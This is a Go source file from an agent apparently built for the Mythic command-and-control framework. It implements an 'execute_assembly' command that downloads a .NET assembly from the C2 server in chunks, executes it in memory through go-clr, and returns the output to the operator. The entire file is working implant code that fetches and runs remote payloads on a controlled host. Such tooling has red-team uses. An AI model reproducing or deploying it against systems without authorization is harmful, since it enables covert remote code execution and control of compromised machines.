package execute_assembly

import (
	// Standard
	"encoding/json"
	"fmt"

	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/utils/structs"
)

type Arguments struct {
	FileID string   `json:"assembly_name"`
	Args   []string `json:"args"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()

	var args Arguments
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}

	if args.FileID == "" {
		msg.SetError("Missing file_id parameter")
		task.Job.SendResponses <- msg
		return
	}

	var fileBytes []byte

	r := structs.GetFileFromMythicStruct{
		FileID:               args.FileID,
		FullPath:             "",
		Task:                 &task,
		ReceivedChunkChannel: make(chan []byte),
	}

	task.Job.GetFileFromMythic <- r

	for {
		chunk := <-r.ReceivedChunkChannel
		if len(chunk) == 0 {
			break
		}
		fileBytes = append(fileBytes, chunk...)
	}

	if len(fileBytes) == 0 {
		msg.SetError("Retrieved assembly is empty")
		task.Job.SendResponses <- msg
		return
	}

	//WORKAROUND: go-clr sends always stderr output even on success, so we need deal with that.
	stdout, stderr := executeAssembly(fileBytes, args.Args)

	if stdout == "" && stderr != "" {
		msg.SetError(stderr)
		task.Job.SendResponses <- msg
		return
	}

	msg.UserOutput = stdout

	if stderr != "" {
		msg.UserOutput += "\n[stderr]\n" + stderr
	}

	msg.Completed = true
	task.Job.SendResponses <- msg

}
